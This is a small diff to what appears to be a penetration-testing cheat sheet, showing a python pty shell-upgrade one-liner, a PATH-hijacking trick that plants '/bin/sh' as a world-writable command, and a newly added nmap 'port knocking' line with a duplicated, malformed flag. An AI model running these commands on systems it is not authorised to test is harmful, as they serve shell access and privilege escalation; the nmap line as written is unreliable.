@@ -10,3 +10,6 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 echo "/bin/sh" > <command>      
 chmod 777 <command>
 export PATH=.:$PATH
+
+# Port knocking
+nmap -nmap -PN --host_timeout 201 --max-retries 0 -p <port> <host>
